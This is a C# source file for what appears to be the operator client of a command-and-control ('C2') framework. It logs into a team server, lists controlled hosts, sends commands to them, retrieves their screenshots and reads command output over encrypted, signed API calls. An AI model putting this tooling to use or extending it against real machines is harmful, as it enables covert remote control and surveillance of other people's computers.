using CsharpHttpHelper;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C2_Client_Ui
{
    
    class ApiAddress
    {
        //private Login Lform = new Login();
        public string Teamhttp = "http://";//http协议
       // private string Server_address = Lform.textBox_address.Text;
        public string TeamCheck = "/v1/Team/Status";//检查服务器是否正常
        public string LoginAddress = "/v1/Team/Access/Login";//登录接口
        public string GetHostList = "/v1/Team_Api/Action/GetHostList";//获取主机列表
        public string AddCmdtype = "/v1/Team_Api/Action/AddCmd"; //添加命令
        public string GetScreenshot = "/v1/Team_Api/Action/GetScreenshot"; //获取主机截图
        public string DelScreenshot = "/v1/Team_Api/Action/DelScreenshot"; //删除截图
        public string GetCmdStr = "/v1/Team_Api/Action/GetCmdStr"; //获取命令执行的结果
    }
    class TeamApi
    {
        private Encode aes = new Encode();
        //private JsonType json = new JsonType();
        private Http http = new Http();
        private ApiAddress apiAddress = new ApiAddress();
        /// <summary>
        /// 登录团队服务器
        /// </summary>
        /// <param name="serveraddress"></param>
        /// <param name="username"></param>
        /// <param name="password"></param>
        /// <returns></returns>
        public string Login(string serveraddress,string username,string password)
        {
            string timestr = http.GetTimeStamp();
            string token = http.CrearToken(username+ password + timestr);
            string address = apiAddress.Teamhttp+serveraddress+apiAddress.LoginAddress;
            //System.Windows.Forms.MessageBox.Show(address);
            LoginInfo loginInfo = new LoginInfo() { Username=username,Password=password,Time=timestr};
            string loginjson = HttpHelper.ObjectToJson(loginInfo);
            loginjson = aes.Encodestr(token, loginjson);
            var a = http.Post(address, loginjson, token,null);
            int code = a.Item1;
            string jwttokenjson = a.Item2;
           // System.Windows.Forms.MessageBox.Show(loginjson);
            if (code==200)
            {
                LoginJson objjson = (LoginJson)HttpHelper.JsonToObject<LoginJson>(jwttokenjson);//处理json
                string jwttoken = objjson.data;
                return jwttoken;
            }
            else
            {
                return null;
            }
        }
        /// <summary>
        /// 获取主机列表
        /// </summary>
        /// <param name="serveraddress"></param>
        /// <param name="jwttoken"></param>
        /// <param name="username"></param>
        /// <returns></returns>
        public IList<HostListInfo>  GetHostList(string serveraddress,string jwttoken ,string username) 
        {
            string timestr = http.GetTimeStamp();
            string token = http.CrearToken(username + jwttoken + timestr);//生成签名
            string address = apiAddress.Teamhttp + serveraddress + apiAddress.GetHostList;
            GetInfo getinfo = new GetInfo() { Username = username, Time = timestr };
            string getinfojson = HttpHelper.ObjectToJson(getinfo);
            getinfojson = aes.Encodestr(token, getinfojson);
            var a = http.Post(address, getinfojson, token, jwttoken);
            int code = a.Item1;
            string listjson = a.Item2;
            //System.Windows.Forms.MessageBox.Show(listjson);
            if (code == 200)
            {
                GetHostJson objjson = (GetHostJson)HttpHelper.JsonToObject<GetHostJson>(listjson);//处理json
                
                //return jwttoken;
                return objjson.data;
            }
            else
            {
               return null;
            }
        }
        /// <summary>
        /// 添加命令类型
        /// </summary>
        /// <param name="serveraddress"></param>
        /// <param name="jwttoken"></param>
        /// <param name="username"></param>
        /// <param name="uuid"></param>
        /// <returns></returns>
        public void AddCmdType(AddMsgtype getinfo)
        {
            string timestr = http.GetTimeStamp();
            string token = http.CrearToken(getinfo.Username + getinfo.Jwttoken + timestr);//生成签名
            string address = apiAddress.Teamhttp + getinfo.Address + apiAddress.AddCmdtype;
            GetInfoUuid getinfo2 = new GetInfoUuid() { Username = getinfo.Username, Time = timestr, Uuid = getinfo.Uuid,Cmdtype=getinfo.Cmdtype,Msg=getinfo.Msg };
            string getinfojson = HttpHelper.ObjectToJson(getinfo2);
           //System.Windows.Forms.MessageBox.Show(getinfojson);
            getinfojson = aes.Encodestr(token, getinfojson);
            http.Post(address, getinfojson, token, getinfo.Jwttoken);
           /*** int code = a.Item1;
            string listjson = a.Item2;
            if (code == 200)
            {
                GetScreetlist objjson = (GetScreetlist)HttpHelper.JsonToObject<GetScreetlist>(listjson);//处理json

                //return jwttoken;
                return objjson.img;
            }
            else
            {
                return null;
            }
           ***/
        }
        /// <summary>
        /// 获取截图
        /// </summary>
        /// <returns></returns>
        public string Getscreenshot(AddMsgtype getinfo) 
        {
            string timestr = http.GetTimeStamp();
            string token = http.CrearToken(getinfo.Username + getinfo.Jwttoken + timestr);//生成签名
            string address = apiAddress.Teamhttp + getinfo.Address + apiAddress.GetScreenshot;
            GetInfoUuid getinfo2 = new GetInfoUuid() { Username = getinfo.Username, Time = timestr ,Uuid= getinfo.Uuid};
            string getinfojson = HttpHelper.ObjectToJson(getinfo2);
            getinfojson = aes.Encodestr(token, getinfojson);
            var a = http.Post(address, getinfojson, token, getinfo.Jwttoken);
            int code = a.Item1;
            string listjson = a.Item2;
            if (code == 200)
            {
                GetScreetlist objjson = (GetScreetlist)HttpHelper.JsonToObject<GetScreetlist>(listjson);//处理json
                if (objjson!=null)
                {
                    return objjson.img;
                }
                return null;
                //return jwttoken;
                
            }
            else
            {
                return null;
            }
        }
        public void Delscreenshot(AddMsgtype getinfo) //删除截图
        {
            string timestr = http.GetTimeStamp();
            string token = http.CrearToken(getinfo.Username + getinfo.Jwttoken + timestr);//生成签名
            string address = apiAddress.Teamhttp + getinfo.Address + apiAddress.DelScreenshot;
            GetInfoUuid getinfo2 = new GetInfoUuid() { Username = getinfo.Username, Time = timestr, Uuid = getinfo.Uuid };
            string getinfojson = HttpHelper.ObjectToJson(getinfo2);
            getinfojson = aes.Encodestr(token, getinfojson);
            http.Post(address, getinfojson, token, getinfo.Jwttoken);
           
        }
        /// <summary>
        /// 获取命令执行返回结果
        /// </summary>
        public string GetCmdstr(AddMsgtype getinfo) {
            string timestr = http.GetTimeStamp();
            string token = http.CrearToken(getinfo.Username + getinfo.Jwttoken + timestr);//生成签名
            string address = apiAddress.Teamhttp + getinfo.Address + apiAddress.GetCmdStr;
            GetInfoUuid getinfo2 = new GetInfoUuid() { Username = getinfo.Username, Time = timestr, Uuid = getinfo.Uuid };
            string getinfojson = HttpHelper.ObjectToJson(getinfo2);
            getinfojson = aes.Encodestr(token, getinfojson);
            var a = http.Post(address, getinfojson, token, getinfo.Jwttoken);
            int code = a.Item1;
            string listjson = a.Item2;
            if (code == 200)
            {
                GetCmdstr objjson = (GetCmdstr)HttpHelper.JsonToObject<GetCmdstr>(listjson);//处理json
                if (objjson != null)
                {
                    return objjson.data;
                }
                return null;
                //return jwttoken;

            }
            else
            {
                return null;
            }
        }
    }
  
}
